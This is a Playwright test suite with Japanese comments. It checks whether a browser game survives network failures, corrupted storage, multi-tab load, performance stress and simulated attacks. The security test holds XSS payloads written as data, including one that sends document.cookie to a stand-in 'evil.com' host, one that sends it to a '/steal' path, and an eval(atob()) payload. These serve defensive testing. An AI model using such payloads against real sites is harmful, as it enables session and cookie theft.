/**
 * 包括的異常シナリオテスト
 * 全ての異常シナリオを統合してテストする総合テストスイート
 */

import { test, expect } from '@playwright/test'
import { 
  AbnormalScenarioRunner,
  NetworkAnomalySimulator,
  StorageAnomalySimulator,
  SecurityAttackSimulator,
  MultiTabSimulator,
  PerformanceMonitor,
  ErrorMonitor
} from '../utils/abnormal-scenario-helpers'

test.describe('🌪️ 包括的異常シナリオテスト', () => {
  
  test.beforeEach(async ({ page }) => {
    // テスト用の詳細ログ設定
    page.on('pageerror', error => {
      console.error(`🔴 Comprehensive Test - Page Error: ${error.message}`)
    })
    
    page.on('console', msg => {
      if (msg.type() === 'error') {
        console.error(`🔴 Comprehensive Test - Console Error: ${msg.text()}`)
      }
    })
  })

  test('🔄 統合異常シナリオ実行', async ({ page, context }) => {
    const scenarioRunner = new AbnormalScenarioRunner(page, context)
    
    console.log('🚀 包括的異常シナリオテスト開始')
    
    // 全異常シナリオを実行
    const results = await scenarioRunner.runAllAbnormalScenarios()
    
    // 結果の検証
    expect(results.networkTests.pageLoaded).toBe(true)
    expect(results.errorCount).toBeLessThan(10) // エラーが少ないことを確認
    expect(results.performanceTests.acceptable).toBe(true)
    
    // レポート生成
    const report = scenarioRunner.generateTestReport(results)
    console.log('\n📊 テスト結果レポート:')
    console.log(report)
    
    console.log('✅ 包括的異常シナリオテスト完了')
  })

  test('🌐 ネットワーク異常の連鎖テスト', async ({ page }) => {
    const networkSimulator = new NetworkAnomalySimulator(page)
    const performanceMonitor = new PerformanceMonitor(page)
    const errorMonitor = new ErrorMonitor(page)
    
    console.log('🌐 ネットワーク異常連鎖テスト開始')
    
    // シナリオ1: 低速接続 → 間欠的切断 → 完全切断 → 復旧
    console.log('📶 Phase 1: 低速接続をシミュレート')
    await networkSimulator.simulateSlowConnection({
      latency: 2000,
      downloadSpeed: 512,
      uploadSpeed: 256,
      packetLoss: 0.05
    })
    
    await page.goto('/', { timeout: 20000 })
    const phase1Memory = await performanceMonitor.monitorMemoryUsage()
    console.log(`Phase 1 メモリ使用率: ${phase1Memory.percentage.toFixed(1)}%`)
    
    // シナリオ2: 間欠的切断
    console.log('⚡ Phase 2: 間欠的切断をシミュレート')
    await networkSimulator.resetNetwork()
    await networkSimulator.simulateIntermittentConnection([false, true, false, false, true])
    
    await page.reload({ timeout: 15000 })
    await page.waitForTimeout(3000)
    
    const phase2Memory = await performanceMonitor.monitorMemoryUsage()
    console.log(`Phase 2 メモリ使用率: ${phase2Memory.percentage.toFixed(1)}%`)
    
    // シナリオ3: 完全切断
    console.log('🔌 Phase 3: 完全切断をシミュレート')
    await networkSimulator.resetNetwork()
    await networkSimulator.simulateConnectionDrop(1)
    
    try {
      await page.reload({ timeout: 8000 })
    } catch (error) {
      console.log('✅ 期待される完全切断エラー:', error.message)
    }
    
    // シナリオ4: 復旧
    console.log('🔄 Phase 4: ネットワーク復旧')
    await networkSimulator.resetNetwork()
    
    await page.goto('/', { timeout: 10000 })
    const phase4Memory = await performanceMonitor.monitorMemoryUsage()
    const finalFPS = await performanceMonitor.measureFPS()
    
    console.log(`Phase 4 メモリ使用率: ${phase4Memory.percentage.toFixed(1)}%`)
    console.log(`復旧後FPS: ${finalFPS}`)
    
    // 最終検証
    const app = page.locator('#app')
    await expect(app).toBeVisible({ timeout: 8000 })
    
    const errorCount = errorMonitor.getErrorCount()
    console.log(`検出エラー数: ${errorCount}`)
    
    // 復旧後のパフォーマンスが許容範囲内であることを確認
    expect(finalFPS).toBeGreaterThan(15)
    expect(phase4Memory.percentage).toBeLessThan(90)
    
    console.log('✅ ネットワーク異常連鎖テスト完了')
  })

  test('💾 ストレージ異常の連鎖テスト', async ({ page }) => {
    const storageSimulator = new StorageAnomalySimulator(page)
    const errorMonitor = new ErrorMonitor(page)
    
    console.log('💾 ストレージ異常連鎖テスト開始')
    
    // シナリオ1: 破損データ注入
    console.log('🔧 Phase 1: 破損データ注入')
    await storageSimulator.injectCorruptedData({
      'gameData': 'invalid json',
      'playerStats': 'null',
      'settings': '{"incomplete": json'
    })
    
    await page.goto('/')
    await page.waitForTimeout(2000)
    
    // アプリが起動することを確認
    const app = page.locator('#app')
    await expect(app).toBeVisible()
    console.log('✅ Phase 1: 破損データ存在下でもアプリ起動')
    
    // シナリオ2: バージョン不整合
    console.log('🔄 Phase 2: バージョン不整合データ注入')
    await storageSimulator.injectVersionMismatchData()
    
    await page.reload()
    await page.waitForTimeout(3000)
    
    // マイグレーション処理が動作することを確認
    const migrationResult = await page.evaluate(() => {
      const keys = Object.keys(localStorage)
      return {
        totalKeys: keys.length,
        hasLegacyData: keys.some(key => key.includes('legacy')),
        hasFutureData: keys.some(key => key.includes('future')),
        hasCurrentData: keys.some(key => key.includes('current') || key.includes('migrated'))
      }
    })
    
    console.log('📊 マイグレーション結果:', migrationResult)
    expect(migrationResult.totalKeys).toBeGreaterThan(0)
    
    // シナリオ3: 容量制限
    console.log('📦 Phase 3: ストレージ容量制限')
    await storageSimulator.simulateStorageQuotaExceeded({
      maxSize: 50000, // 50KB制限
      currentUsage: 0,
      throwOnExceed: true
    })
    
    // ゲーム開始とプレイで大量データ生成を試行
    const startButton = page.locator('text=ゲームをプレイ').first()
    if (await startButton.isVisible({ timeout: 5000 })) {
      await startButton.click()
      await page.waitForTimeout(3000)
      
      const canvas = page.locator('canvas')
      if (await canvas.isVisible({ timeout: 5000 })) {
        // 大量のゲーム操作でストレージ使用量を増加
        for (let i = 0; i < 20; i++) {
          await canvas.click({ position: { x: 100 + i * 5, y: 100 + i * 5} })
          await page.waitForTimeout(200)
        }
        
        console.log('🎮 大量ゲーム操作完了')
      }
    }
    
    // シナリオ4: 同時書き込み競合
    console.log('⚡ Phase 4: 同時書き込み競合')
    await storageSimulator.simulateConcurrentWrites(['gameData', 'playerStats'], 15)
    
    await page.waitForTimeout(2000)
    
    // 最終的なデータ整合性確認
    const finalDataCheck = await page.evaluate(() => {
      const gameData = localStorage.getItem('gameData')
      const playerStats = localStorage.getItem('playerStats')
      
      let gameDataValid = false
      let statsValid = false
      
      try {
        if (gameData) {
          JSON.parse(gameData)
          gameDataValid = true
        }
      } catch (e) {
        console.log('GameData parse error:', e)
      }
      
      try {
        if (playerStats) {
          JSON.parse(playerStats)
          statsValid = true
        }
      } catch (e) {
        console.log('PlayerStats parse error:', e)
      }
      
      return {
        gameDataValid,
        statsValid,
        totalStorageItems: Object.keys(localStorage).length
      }
    })
    
    console.log('📊 最終データ整合性:', finalDataCheck)
    
    // アプリケーションが依然として動作していることを確認
    const appStillWorking = await page.locator('#app').isVisible()
    expect(appStillWorking).toBe(true)
    
    const errorCount = errorMonitor.getErrorCount()
    console.log(`最終エラー数: ${errorCount}`)
    
    console.log('✅ ストレージ異常連鎖テスト完了')
  })

  test('🛡️ セキュリティ攻撃の連鎖テスト', async ({ page, context }) => {
    const securitySimulator = new SecurityAttackSimulator(page)
    const errorMonitor = new ErrorMonitor(page)
    
    console.log('🛡️ セキュリティ攻撃連鎖テスト開始')
    
    await page.goto('/')
    
    // シナリオ1: XSS攻撃の段階的エスカレーション
    console.log('🚨 Phase 1: XSS攻撃エスカレーション')
    const xssThreats = [
      { type: 'xss' as const, payload: '<script>alert("basic")</script>', severity: 'medium' as const },
      { type: 'xss' as const, payload: '<img src="x" onerror="eval(atob(\'YWxlcnQoJ2VuY29kZWQnKQ==\'))">', severity: 'high' as const },
      { type: 'xss' as const, payload: '<svg onload="fetch(\'/steal?data=\'+document.cookie)">', severity: 'critical' as const },
      { type: 'xss' as const, payload: 'javascript:window.location="http://evil.com?"+document.cookie', severity: 'critical' as const }
    ]
    
    const xssResults = await securitySimulator.simulateXSSAttack(xssThreats)
    console.log(`XSS攻撃結果: ${xssResults.blocked}件阻止, ${xssResults.successful}件成功`)
    
    expect(xssResults.blocked).toBeGreaterThan(xssResults.successful)
    
    // シナリオ2: CSRF攻撃
    console.log('🔒 Phase 2: CSRF攻撃')
    const csrfAttempted = await securitySimulator.simulateCSRFAttack(page.url())
    console.log(`CSRF攻撃試行: ${csrfAttempted ? '実行' : '失敗'}`)
    
    // オリジナルページに戻る
    await page.goto('/')
    await page.waitForTimeout(2000)
    
    // シナリオ3: データ改ざん攻撃
    console.log('🔓 Phase 3: データ改ざん攻撃')
    const tamperingResults = await securitySimulator.simulateDataTampering()
    console.log(`データ改ざん: ${tamperingResults.attempts}件中${tamperingResults.successful}件成功`)
    
    // シナリオ4: DoS攻撃
    console.log('💣 Phase 4: DoS攻撃')
    const dosResults = await securitySimulator.simulateDoSAttack()
    console.log('DoS攻撃結果:', dosResults)
    
    // アプリケーションが引き続き安全に動作していることを確認
    await page.waitForTimeout(3000)
    
    const securityIntegrityCheck = await page.evaluate(() => {
      return {
        appStillRunning: !!document.querySelector('#app'),
        noMaliciousScripts: document.querySelectorAll('script[src*="evil"], script[src*="malicious"]').length === 0,
        cookiesSecure: document.cookie.length === 0 || !document.cookie.includes('malicious'),
        noPopups: !window.alert.toString().includes('native') // アラートが乗っ取られていない
      }
    })
    
    console.log('🔍 セキュリティ整合性チェック:', securityIntegrityCheck)
    
    expect(securityIntegrityCheck.appStillRunning).toBe(true)
    expect(securityIntegrityCheck.noMaliciousScripts).toBe(true)
    
    const finalErrorCount = errorMonitor.getErrorCount()
    console.log(`最終セキュリティエラー数: ${finalErrorCount}`)
    
    console.log('✅ セキュリティ攻撃連鎖テスト完了')
  })

  test('🔄 マルチタブ異常操作の連鎖テスト', async ({ context }) => {
    const multiTabSimulator = new MultiTabSimulator(context)
    
    console.log('🔄 マルチタブ異常操作連鎖テスト開始')
    
    // シナリオ1: 大量タブでの同時起動
    console.log('👥 Phase 1: 大量タブ同時起動')
    const tabs = await multiTabSimulator.simulateConcurrentTabs(8, '/')
    
    // 各タブでゲーム開始を試行
    const gameStartResults = await multiTabSimulator.executeOnAllTabs(async (tab, index) => {
      try {
        const startButton = tab.locator('text=ゲームをプレイ').first()
        if (await startButton.isVisible({ timeout: 5000 })) {
          await startButton.click()
          await tab.waitForTimeout(2000)
          
          const canvas = tab.locator('canvas')
          const gameStarted = await canvas.isVisible({ timeout: 5000 })
          
          return { tab: index + 1, gameStarted, error: null }
        }
        return { tab: index + 1, gameStarted: false, error: 'No start button' }
      } catch (error) {
        return { tab: index + 1, gameStarted: false, error: error.message }
      }
    })
    
    console.log('🎮 ゲーム開始結果:', gameStartResults)
    
    const successfulStarts = gameStartResults.filter(result => result.gameStarted).length
    console.log(`${successfulStarts}/${tabs.length} タブでゲーム開始成功`)
    
    // シナリオ2: データ同期テスト
    console.log('🔄 Phase 2: データ同期テスト')
    const syncResult = await multiTabSimulator.testDataSync()
    console.log('データ同期結果:', syncResult)
    
    // シナリオ3: 高速タブ切り替え
    console.log('⚡ Phase 3: 高速タブ切り替え')
    for (let i = 0; i < tabs.length; i++) {
      await multiTabSimulator.simulateTabSwitching(i)
      await new Promise(resolve => setTimeout(resolve, 500))
    }
    
    // シナリオ4: 同時大量操作
    console.log('💥 Phase 4: 同時大量操作')
    const concurrentOperations = await multiTabSimulator.executeOnAllTabs(async (tab, index) => {
      const operations = []
      
      try {
        const canvas = tab.locator('canvas')
        if (await canvas.isVisible({ timeout: 3000 })) {
          // 各タブで大量クリック
          for (let i = 0; i < 50; i++) {
            operations.push(
              canvas.click({ 
                position: { x: 50 + i * 2, y: 50 + i * 2 },
                timeout: 1000
              }).catch(error => ({ error: error.message, click: i }))
            )
          }
        }
        
        const results = await Promise.allSettled(operations)
        const successful = results.filter(r => r.status === 'fulfilled').length
        
        return { tab: index + 1, successful, total: operations.length }
      } catch (error) {
        return { tab: index + 1, successful: 0, total: 0, error: error.message }
      }
    })
    
    console.log('🎯 同時操作結果:', concurrentOperations)
    
    // 最終的な安定性確認
    await new Promise(resolve => setTimeout(resolve, 3000))
    
    const finalStabilityCheck = await multiTabSimulator.executeOnAllTabs(async (tab, index) => {
      try {
        const app = tab.locator('#app')
        const isVisible = await app.isVisible({ timeout: 3000 })
        
        const memory = await tab.evaluate(() => {
          return (performance as any).memory?.usedJSHeapSize || 0
        })
        
        return { 
          tab: index + 1, 
          appVisible: isVisible, 
          memoryUsage: memory,
          responsive: true
        }
      } catch (error) {
        return { 
          tab: index + 1, 
          appVisible: false, 
          memoryUsage: 0,
          responsive: false,
          error: error.message
        }
      }
    })
    
    console.log('🔍 最終安定性チェック:', finalStabilityCheck)
    
    const responsiveTabs = finalStabilityCheck.filter(check => check.responsive).length
    const averageMemory = finalStabilityCheck.reduce((sum, check) => sum + check.memoryUsage, 0) / finalStabilityCheck.length
    
    console.log(`レスポンシブタブ数: ${responsiveTabs}/${tabs.length}`)
    console.log(`平均メモリ使用量: ${Math.round(averageMemory / 1024 / 1024)}MB`)
    
    // 少なくとも半数のタブが正常動作していることを確認
    expect(responsiveTabs).toBeGreaterThan(tabs.length / 2)
    
    // クリーンアップ
    await multiTabSimulator.closeAllTabs()
    
    console.log('✅ マルチタブ異常操作連鎖テスト完了')
  })

  test('⚡ パフォーマンス劣化の連鎖テスト', async ({ page }) => {
    const performanceMonitor = new PerformanceMonitor(page)
    const errorMonitor = new ErrorMonitor(page)
    
    console.log('⚡ パフォーマンス劣化連鎖テスト開始')
    
    await page.goto('/')
    
    // 初期パフォーマンスベースライン測定
    const baseline = {
      memory: await performanceMonitor.monitorMemoryUsage(),
      fps: await performanceMonitor.measureFPS(1000),
      loadTime: await performanceMonitor.measureLoadTime()
    }
    
    console.log('📊 ベースラインパフォーマンス:', baseline)
    
    // シナリオ1: メモリリーク誘発
    console.log('🧠 Phase 1: メモリリーク誘発')
    await page.evaluate(() => {
      // メモリリークをシミュレート
      const leakArray: any[] = []
      
      const createLeak = () => {
        const data = new Array(10000).fill({
          timestamp: Date.now(),
          data: Math.random().toString(36),
          ref: leakArray // 循環参照を作る
        })
        leakArray.push(data)
      }
      
      // 50回リークを作成
      for (let i = 0; i < 50; i++) {
        createLeak()
      }
      
      console.log('Memory leak simulation completed')
    })
    
    const phase1Memory = await performanceMonitor.monitorMemoryUsage()
    console.log(`Phase 1 メモリ使用量: ${phase1Memory.percentage.toFixed(1)}%`)
    
    // シナリオ2: CPU集約的処理負荷
    console.log('🔥 Phase 2: CPU集約的処理負荷')
    await page.evaluate(() => {
      // CPU集約的な処理をシミュレート
      const startTime = Date.now()
      const duration = 3000 // 3秒間
      
      const cpuIntensiveTask = () => {
        let result = 0
        const iterations = 100000
        
        for (let i = 0; i < iterations; i++) {
          result += Math.sqrt(i) * Math.sin(i) * Math.cos(i)
          
          // 時間制限チェック
          if (Date.now() - startTime > duration) {
            break
          }
        }
        
        return result
      }
      
      // 複数の並行処理
      Promise.all([
        new Promise(resolve => setTimeout(() => resolve(cpuIntensiveTask()), 0)),
        new Promise(resolve => setTimeout(() => resolve(cpuIntensiveTask()), 100)),
        new Promise(resolve => setTimeout(() => resolve(cpuIntensiveTask()), 200))
      ])
    })
    
    await page.waitForTimeout(4000)
    
    const phase2Performance = {
      memory: await performanceMonitor.monitorMemoryUsage(),
      fps: await performanceMonitor.measureFPS(2000)
    }
    
    console.log('📊 Phase 2 パフォーマンス:', phase2Performance)
    
    // シナリオ3: DOM操作過負荷
    console.log('🌐 Phase 3: DOM操作過負荷')
    await page.evaluate(() => {
      const container = document.createElement('div')
      container.id = 'performance-test-container'
      container.style.display = 'none'
      document.body.appendChild(container)
      
      // 大量のDOM要素を作成
      for (let i = 0; i < 5000; i++) {
        const element = document.createElement('div')
        element.className = `test-element-${i}`
        element.innerHTML = `
          <span>Element ${i}</span>
          <button onclick="console.log('clicked ${i}')">Click ${i}</button>
          <input type="text" value="test value ${i}">
        `
        container.appendChild(element)
      }
      
      console.log('DOM overload simulation completed')
    })
    
    const phase3Performance = {
      memory: await performanceMonitor.monitorMemoryUsage(),
      fps: await performanceMonitor.measureFPS(2000)
    }
    
    console.log('📊 Phase 3 パフォーマンス:', phase3Performance)
    
    // シナリオ4: ガベージコレクション圧迫
    console.log('🗑️ Phase 4: ガベージコレクション圧迫')
    await page.evaluate(() => {
      // 大量の短期オブジェクトを生成してGCを誘発
      const gcPressureTest = () => {
        for (let i = 0; i < 1000; i++) {
          const tempObject = {
            id: i,
            data: new Array(1000).fill(Math.random()),
            timestamp: Date.now(),
            nested: {
              level1: { level2: { level3: new Array(100).fill('gc-pressure') } }
            }
          }
          
          // 即座に参照を削除してGC候補にする
          JSON.stringify(tempObject)
        }
      }
      
      // GC圧迫を複数回実行
      for (let cycle = 0; cycle < 20; cycle++) {
        gcPressureTest()
      }
      
      console.log('GC pressure simulation completed')
    })
    
    await page.waitForTimeout(2000)
    
    const finalPerformance = {
      memory: await performanceMonitor.monitorMemoryUsage(),
      fps: await performanceMonitor.measureFPS(3000),
      loadTime: await performanceMonitor.measureLoadTime()
    }
    
    console.log('📊 最終パフォーマンス:', finalPerformance)
    
    // パフォーマンス劣化度合いを計算
    const degradation = {
      memoryIncrease: finalPerformance.memory.percentage - baseline.memory.percentage,
      fpsDecrease: baseline.fps - finalPerformance.fps,
      loadTimeIncrease: finalPerformance.loadTime.complete - baseline.loadTime.complete
    }
    
    console.log('📉 パフォーマンス劣化:', degradation)
    
    // アプリケーションが依然として動作していることを確認
    const app = page.locator('#app')
    await expect(app).toBeVisible()
    
    // 基本的な操作が可能か確認
    const startButton = page.locator('text=ゲームをプレイ').first()
    if (await startButton.isVisible({ timeout: 5000 })) {
      await startButton.click({ timeout: 10000 })
      await page.waitForTimeout(3000)
      
      const canvas = page.locator('canvas')
      const gameStillPlayable = await canvas.isVisible({ timeout: 5000 })
      
      console.log(`ゲーム動作性: ${gameStillPlayable ? '正常' : '異常'}`)
      expect(gameStillPlayable).toBe(true)
    }
    
    // 許容範囲内の劣化であることを確認
    expect(degradation.memoryIncrease).toBeLessThan(50) // 50%以下の増加
    expect(finalPerformance.fps).toBeGreaterThan(10) // 最低10FPS
    
    const errorCount = errorMonitor.getErrorCount()
    console.log(`パフォーマンステスト中のエラー数: ${errorCount}`)
    
    console.log('✅ パフォーマンス劣化連鎖テスト完了')
  })

  test('🌪️ 究極の異常状況統合テスト', async ({ page, context }) => {
    console.log('🌪️ 究極の異常状況統合テスト開始 - 全ての異常を同時実行')
    
    const networkSimulator = new NetworkAnomalySimulator(page)
    const storageSimulator = new StorageAnomalySimulator(page)
    const securitySimulator = new SecurityAttackSimulator(page)
    const performanceMonitor = new PerformanceMonitor(page)
    const errorMonitor = new ErrorMonitor(page)
    
    // すべての異常状況を同時に設定
    await Promise.all([
      // ネットワーク異常
      networkSimulator.simulateSlowConnection({
        latency: 1500,
        downloadSpeed: 1024,
        uploadSpeed: 512,
        packetLoss: 0.1
      }),
      
      // ストレージ異常
      storageSimulator.simulateStorageQuotaExceeded({
        maxSize: 100000, // 100KB制限
        currentUsage: 0,
        throwOnExceed: true
      }),
      
      // 破損データ注入
      storageSimulator.injectCorruptedData({
        'gameData_corrupted': 'invalid json data',
        'malicious_script': '<script>alert("injection")</script>'
      })
    ])
    
    console.log('🚨 全異常状況設定完了')
    
    // 異常状況下でのアプリケーション起動
    const startTime = Date.now()
    
    try {
      await page.goto('/', { timeout: 30000 })
    } catch (error) {
      console.log('⚠️ 初回読み込み失敗、リトライ中:', error.message)
      
      // リトライ戦略
      await networkSimulator.resetNetwork()
      await page.goto('/', { timeout: 15000 })
    }
    
    const loadTime = Date.now() - startTime
    console.log(`📊 異常環境下での読み込み時間: ${loadTime}ms`)
    
    // アプリケーションの基本機能確認
    const app = page.locator('#app')
    await expect(app).toBeVisible({ timeout: 10000 })
    
    console.log('✅ 異常環境下でもアプリケーション起動成功')
    
    // セキュリティ攻撃を実行
    const securityResults = await Promise.allSettled([
      securitySimulator.simulateXSSAttack([
        { type: 'xss', payload: '<script>window.__ULTIMATE_XSS=true</script>', severity: 'critical' }
      ]),
      securitySimulator.simulateDataTampering(),
      securitySimulator.simulateDoSAttack()
    ])
    
    console.log('🛡️ セキュリティ攻撃実行結果:', securityResults)
    
    // パフォーマンス測定
    const ultimatePerformance = {
      memory: await performanceMonitor.monitorMemoryUsage(),
      fps: await performanceMonitor.measureFPS(2000),
      loadTime: loadTime
    }
    
    console.log('📊 究極環境下パフォーマンス:', ultimatePerformance)
    
    // ゲーム機能の動作確認
    let gamePlayable = false
    
    try {
      const startButton = page.locator('text=ゲームをプレイ').first()
      if (await startButton.isVisible({ timeout: 8000 })) {
        await startButton.click({ timeout: 10000 })
        await page.waitForTimeout(5000)
        
        const canvas = page.locator('canvas')
        gamePlayable = await canvas.isVisible({ timeout: 8000 })
        
        if (gamePlayable) {
          // 基本操作テスト
          await canvas.click({ position: { x: 100, y: 100 }, timeout: 5000 })
          await page.waitForTimeout(2000)
          
          console.log('🎮 究極環境下でもゲームプレイ可能')
        }
      }
    } catch (error) {
      console.log('⚠️ ゲーム機能テスト中にエラー:', error.message)
    }
    
    // 最終的な安定性確認
    await page.waitForTimeout(3000)
    
    const finalStabilityCheck = await page.evaluate(() => {
      return {
        appElementExists: !!document.querySelector('#app'),
        domNodeCount: document.querySelectorAll('*').length,
        hasJavaScriptErrors: !!(window as any).__ULTIMATE_XSS,
        localStorageAccessible: (() => {
          try {
            localStorage.setItem('stability_test', 'ok')
            localStorage.removeItem('stability_test')
            return true
          } catch {
            return false
          }
        })(),
        memoryPressure: (performance as any).memory?.usedJSHeapSize > 50000000 // 50MB
      }
    })
    
    console.log('🔍 最終安定性チェック:', finalStabilityCheck)
    
    const errorCount = errorMonitor.getErrorCount()
    const totalErrors = errorCount
    
    // 究極テストの成功基準
    const testSuccess = {
      appSurvived: finalStabilityCheck.appElementExists,
      performanceAcceptable: ultimatePerformance.fps > 5 && ultimatePerformance.memory.percentage < 95,
      securityMaintained: !finalStabilityCheck.hasJavaScriptErrors,
      functionalityPreserved: gamePlayable || loadTime < 60000,
      errorCountManageable: totalErrors < 20
    }
    
    console.log('🏆 究極テスト成功基準:', testSuccess)
    
    // 最終評価
    const overallSuccess = Object.values(testSuccess).filter(Boolean).length >= 3 // 5項目中3項目以上成功
    
    console.log(`🎯 総合評価: ${overallSuccess ? '✅ 合格' : '❌ 不合格'}`)
    console.log(`📊 詳細スコア: ${Object.values(testSuccess).filter(Boolean).length}/5`)
    
    // 基本的な生存確認（最低限のテスト）
    expect(finalStabilityCheck.appElementExists).toBe(true)
    expect(ultimatePerformance.memory.percentage).toBeLessThan(98) // 98%未満
    
    if (overallSuccess) {
      console.log('🏆 究極の異常状況統合テスト - 全体的に成功！')
    } else {
      console.log('⚠️ 究極の異常状況統合テスト - 改善の余地あり')
    }
    
    console.log('✅ 究極の異常状況統合テスト完了')
  })
})